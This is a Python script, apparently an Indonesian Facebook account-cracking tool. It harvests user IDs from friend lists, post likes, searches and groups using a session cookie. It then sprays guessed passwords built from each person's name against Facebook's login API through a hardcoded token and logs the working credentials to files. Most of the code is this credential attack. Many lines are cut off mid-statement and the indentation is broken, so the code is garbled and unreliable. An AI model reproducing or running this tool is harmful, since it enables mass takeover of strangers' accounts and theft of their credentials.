#!/usr/bin/env python3
import requests,mechanize,bs4,sys,os,subprocess,uuid,random,tim>
from random import randint
from urllib.parse import quote
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup as parser
from datetime import date
from datetime import datetime

# -*- coding: utf-8 -*-

def croot():
    os.system("git pull")
def ikeh_ikeh_kimochi():
    os.system("clear")
def aahh(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./300)
def kontol():
    time.sleep(0.3)
    aahh("""\n\x1b[1;36m
    _____ _ _ _             _
   | ____| (_) |_ ___      / |
   |  _| | | | __/ _ \_____| |
   | |___| | | ||  __/_____| |
   |_____|_|_|\__\___|     |_|
                     | Author : yosua wauran
                     | WhatsApp : 0895360097502
                     | script versi : 1.2
\x1b[1;94m────────────────────────────────────────────────────">

def jembut():
    print("""\n\x1b[1;36m
    _____ _     ___ _____ _____
   | ____| |   |_ _|_   _| ____|
   |  _| | |    | |  | | |  _|
   | |___| |___ | |  | | | |___
   |_____|_____|___| |_| |_____|
                                   versi:1.2
\x1b[1;94m────────────────────────────────────────────────────
\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] Author   : yosua wauran
\x1b[1;94m────────────────────────────────────────────────────">

def yayanxd():
    yayan=input("\n\033[00m\t   [\033[96m Press Enter To Return>
    if yayan == "":
       os.system("python Cr4ck.py")
    else:
       sys.exit("\n\033[1;97m [\033[1;91m•\033[1;97m] \033[1;91>
def moch_yayan():
    time.sleep(0.1)
    print("\033[97m [\033[96m01\033[36m] Masuk pakai cookie fac>
    print("\033[97m [\033[96m02\033[36m] Tutor  How to Get Fb C>
    print("\033[97m [\033[91m00\033[31m] Exit")
    print("\x1b[1;94m──────────────────────────────────────────>
    time.sleep(0.1)

    yayan=input("\x1b[1;97m [\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] >
    if yayan == "1" or yayan =="01":
         mbasic = 'https://mbasic.facebook.com{}'
         global die,check,result, count
         id = []
         die = 0
         chek = []
         hack = []
         count = 0
         check = 0
         result = 0
         def masuk():
             try:
               cek = open("cookies").read()
             except FileNotFoundError:
                   ikeh_ikeh_kimochi()
                   kontol()
                   cek = input("\n\033[0;92m       [ \033[0;97m>
                   print('\n\033[97m [\033[92m+\033[97m] \033[9>
             cek = {"cookie":cek}
             ismi = ses.get(mbasic.format("/me",verify=False),c>
             if "mbasic_logout_button" in str(ismi):
                     if "Apa yang Anda pikirkan sekarang" in st>
                             with open("cookies","w") as f:
                                     f.write(cek["cookie"])
                     else:
                           print("\033[1;97m[\033[1;94m•\033[1;>
                           try:
                                  requests.get(mbasic.format(pa>
                           except:
                                  pass
                     try:
                             ikuti = parser(requests.get(mbasic>
                             ses.get(mbasic.format(ikuti),cooki>
                     except :
                             pass
                     return cek["cookie"]
                     aahh('\033[1;97m[\033[1;94m√\033[1;97m] \0>
             else:
                  os.system('rm -rf cookies')
                  print(" \n \x1b[1;97m[\x1b[1;91m!\x1b[1;97m] >
                  os.system('python Cr4ck.py')
         def login(username,password,cek=False):
             global die,check,result,count
             b = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a>
             params = {
                     'access_token': b,
                     'format': 'JSON',
                     'sdk_version': '2',
                     'email': username,
                     'locale': 'en_US',
                     'password': password,
                     'sdk': 'ios',
                     'generate_session_cookies': '1',
                     'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
             }
             api = 'https://b-api.facebook.com/method/auth.logi>
             response = requests.get(api, params=params)
             if 'EAA' in response.text:
                 print(f"\r\033[1;92m  * --> {username}|{passwo>
                 print()
                 result += 1
                 if cek:
                        life.append(username+"|"+password)
                 else:
                        with open('ok.txt','a') as f:
                                f.write(username + '|' + passwo>
             elif 'www.facebook.com' in response.json()['error_>
                   print(f"\r\033[1;93m  * --> {username}|{pass>
                   print()
                   check += 1
                   if cek:
                           chek.append(username+"|"+password)
                   else:
                           with open('cp.txt','a') as f:
                                f.write(username + '|' + passwo>
             else:
                   die += 1
             for i in list('\|/-•'):
                            print(f"\r\033[00m [\033[1;91m{i}\0>
                            time.sleep(0.2)
         def getid(url):
             raw = requests.get(url,cookies=kuki).content
             getuser = re.findall('middle"><a class=".." href=">
             for x in getuser:
                 if 'profile' in x[0]:
                        id.append(x[1] + '|' + re.findall("=(\d>
                 elif 'friends' in x:
                        continue
                 else:
                        id.append(x[1] + '|' + x[0].split('/')[>
                 print('\r\033[1;97m [\033[1;94m•\033[1;97m] \0>
             if 'Lihat Teman Lain' in str(raw):
                 getid(mbasic.format(parser(raw,'html.parser').>
             return id
         def fromlikes(url):
             try:
             like = requests.get(url,cookies=kuki).content
                  love = re.findall('href="(/ufi.*?)"',str(like>
                  aws = getlike(mbasic.format(love))
                  return aws
             except:
                  exit(" \033[1;97m [\033[1;94m•\033[1;97m] Lin>
         def getlike(react):
             like = requests.get(react,cookies=kuki).content
             ids  = re.findall('class="b."><a href="(.*?)">(.*?>
             for user in ids:
                 if 'profile' in user[0]:
                         id.append(user[1] + "|" + re.findall(">
                 else:
                         id.append(user[1] + "|" + user[0].spli>
                 print(f'\r\033[1;97m [\033[1;94m•\033[1;97m] \>
             if 'Lihat Selengkapnya' in str(like):
                 getlike(mbasic.format(parser(like,'html.parser>
             return id
         def bysearch(option):
             search = requests.get(option,cookies=kuki).content
             users = re.findall('class="x ch"><a href="/(.*?)">>
             for user in users:
                  if "profile" in user[0]:
                         id.append(user[1] + "|" + re.findall(">
                  else:
                         id.append(user[1] + "|" + user[0].spli>
                  print(f"\r\033[1;97m [\033[1;94m•\033[1;97m] >
             if "Lihat Hasil Selanjutnya" in str(search):
                  bysearch(parser(search,'html.parser').find("a>
             return id
         def grubid(endpoint):
             grab = requests.get(endpoint,cookies=kuki).content
             users = re.findall('a class=".." href="/(.*?)">(.*>
             for user in users:
                 if "profile" in user[0]:
                         id.append(user[1] + "|" + re.findall('>
                 else:
                         id.append(user[1] + "|" + user[0])
                 print(f"\r\033[1;97m [\033[1;94m•\033[1;97m] \>
             if "Lihat Selengkapnya" in str(grab):
                 grubid(mbasic.format(parser(grab,"html.parser">
             return id
         if __name__ == '__main__':
               try:
               ses = requests.Session()
                   kukis = masuk()
                   kuki = {'cookie':kukis}
                   ikeh_ikeh_kimochi()
                   kontol()
                   aahh('\033[1;97m [\033[1;92m01\033[1;36m] Cr>
                   aahh('\033[1;97m [\033[1;92m02\033[1;36m] Cr>
                   aahh('\033[1;97m [\033[1;92m03\033[1;36m] Cr>
                   aahh('\033[1;97m [\033[1;92m04\033[1;36m] Cr>
                   aahh('\033[1;97m [\033[1;92m05\033[1;36m] Cr>
                   aahh('\033[1;97m [\033[1;92m06\033[1;36m] Vi>
                   aahh('\033[1;31m [\033[1;92m07\033[1;97m] De>
                   aahh('\033[1;97m [\033[1;91m08\033[1;36m] Ga>
                   aahh('\033[1;97m [\033[1;91m00\033[1;31m] Ex>
                   print('\x1b[1;94m───────────────────────────>
                   memek = input('\x1b[1;97m [\x1b[1;94m•\x1b[1>
                   if memek =="":
                         print("\n\n\033[00m [\033[91m!\033[00m>
                         yayanxd()
                   elif memek == '0' or memek =='00':
                         aahh("\n\033[1;92m Thank you for using>
                         os.system('xdg-open https://youtube.co>
                         exit()
                   elif memek == '7' or memek =='07':
                         print("\n\x1b[1;97m [\x1b[1;96m+\x1b[1>
                         aahh("\x1b[1;92m • 10")
                         aahh("\x1b[1;93m •• 20")
                         aahh("\x1b[1;94m ••• 30")
                         aahh("\x1b[1;95m •••• 40")
                         aahh("\x1b[1;96m ••••• 50")
                         aahh("\x1b[1;97m •••••• 60")
                         aahh("\x1b[1;92m ••••••• 70")
                         aahh("\x1b[1;91m •••••••• 80")
                         aahh("\x1b[1;96m ••••••••• 90")
                         aahh("\x1b[1;94m •••••••••• 100%")
                         os.system("rm -rf cookies")
                         print("\n\x1b[1;97m [\x1b[1;92m√\x1b[1>
                         yayanxd()
                   elif memek == '1' or memek =='01':
                         url = parser(ses.get(mbasic.format('/m>
                         username = getid(mbasic.format(url["hr>
                   elif memek == '2' or memek =='02':
                         username = input("\033[1;97m\n [\033[1>
                         if username == "":
                         exit("\033[00m[\033[91m!\033[0>
                         elif 'www.facebook' in username:
                                 username = username.replace('w>
                         elif 'www.facebook' in username:
                                 username = username.replace('m>
                         username = fromlikes(username)
                   elif memek == '3' or memek =='03':
                         knf = input("\033[1;97m\n [\033[1;96m?>
                         username = bysearch(mbasic.format('/se>
                         if len(username) == 0:
                                 exit("\033[90m[\033[91m!\033[9>
                   elif memek == '4' or memek =='04':
                         print("\033[1;97m\n [\033[1;94m•\033[1>
                         grab = input("\033[1;97m[\033[1;96m?\0>
                         username = grubid(mbasic.format("/brow>
                         if len(username) == 0:
                                 exit("\033[00m[\033[91m!\033[0>
                   elif memek == '5' or memek =='05':
                         knf = input("\033[1;97m\n [\033[1;96m?>
                         if knf.isdigit():
                                 user = "/profile.php?id=" + knf
                         else:
                                 user = "/" + knf
                         try:
                                 user = parser(requests.get(mba>
                                 username = getid(mbasic.format>
                         except TypeError:
                                 exit("\033[00m[\033[91m!\033[0>
                   elif memek == '6' or memek =='06':
                         try:
                                 file1 = open("cp.txt").read()
                                 file2 = open("ok.txt").read()
                                 a = file1 + file2
                                 final = a.strip().split("\n")
                                 final = set(final)
                                 print(f"\033[97m\n [\033[93m{s>
                                 with ThreadPoolExecutor(max_wo>
                                         for user in final:
                                                 a = user.split>
                                                 ex.submit(logi>
                                 for x in result:
                                         with open('ok.txt','a'>
                                                 f.write(x+'\n')
                                 for x in chek:
                                         with open('cp.txt','a'>
                                                 f.write(x+"\n")

                                 print("\n\x1b[1;97m[\x1b[1;94m>
                                 print("\x1b[1;97m[\x1b[1;94m✓\>
                         except FileNotFoundError:
                                 exit("\n\033[00m[\033[91m!\033>
                   else:
                         print("\n\n \033[00m[\033[91m!\033[00m>
                         yayanxd()
                   print()
                   ikeh_ikeh_kimochi()
                   jembut()
                   print('\n\x1b[1;96m        ✰★✰╭⍝╮⎝҂⚆⏝⚆⍀⎠╭⍝╮✰>
                   print('\x1b[1;95m     疊╔═╦═────••♽••─────═╦>
                   print('\x1b[1;97m           Total ID\x1b[1;3>
                   expass = input("\n\033[1;97m [\033[1;96m?\03>
                   expass = input("\033[1;97m [\033[1;96m?\033[>
                   expass = input("\033[1;97m [\033[1;96m?\033[>
                   aahh('\x1b[1;94m────────────────────────────>
                   ikeh_ikeh_kimochi()
                   jembut()
                   print('\n\x1b[1;92m        ✰★✰╭⍝╮⎝҂⚆⏝⚆⍀⎠╭⍝╮✰>
                   print('\x1b[1;97m     疊╔═╦═────••♽••─────═╦>
                   print('\x1b[1;96m           Total ID\x1b[1;3>
                   print('\n\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] >
                   print('\n [\x1b[1;91m!\x1b[1;97m] turn off d>
                   with ThreadPoolExecutor(max_workers=30) as e>
                          for user in username:
                          users = user.split('|')
                                  ss = users[0].split(' ')
                                  for x in ss:
                                          listpass = [
                                                  str(x) + '123>
                                                  str(x) + '123>
                                                  str(x) + '123>
                                                  str(x) + '123>
                                                  ]
                                          listpass.append(expas>
                                          for passw in set(list>
                                                  ex.submit(log>
                   if check != 0 or result != 0:
                           time.sleep(0.1)
                           print("\n\n\x1b[1;92m  *\x1b[1;97m f>

                   else:
                           print("\n\n\x1b[1;96m  *\x1b[1;97m y>
               except (KeyboardInterrupt,EOFError):
                       exit()
               except requests.exceptions.ConnectionError:
                       exit("\n\n\033[00m  [\033[91m!\033[00m] >

    elif yayan == "2" or yayan =="02":
         os.system("xdg-open https://youtu.be/72zvkSbVPOI")
         yosuaX()
    elif yayan == "3" or yayan =="03":
         os.system('xdg-open https://www.facebook.com/groups/15>
         yosuaX()
    elif yayan == "4" or yayan =="04":
         os.system('xdg-open https://www.facebook.com/groups/38>
         yosuaX()
    elif yayan == "5" or yayan =="05":
         print("\n\n\x1b[1;97m      [ \x1b[1;92mPlease Wait Whi>
         os.system("git pull")
         print("\n \x1b[1;97m[\x1b[1;92m√\x1b[1;97m]\x1b[1;92m >
         yosuaX()
    elif yayan == "0" or yayan =="00":
         aahh("\n\033[1;92m Thank you for using my tools.\n  Do>
         os.system('xdg-open https://youtube.com/channel/UCNvDa>
         exit()

if __name__=="__main__":
     ikeh_ikeh_kimochi()
     croot()
     ikeh_ikeh_kimochi()
     kontol()
     moch_yayan()
     yosuaX()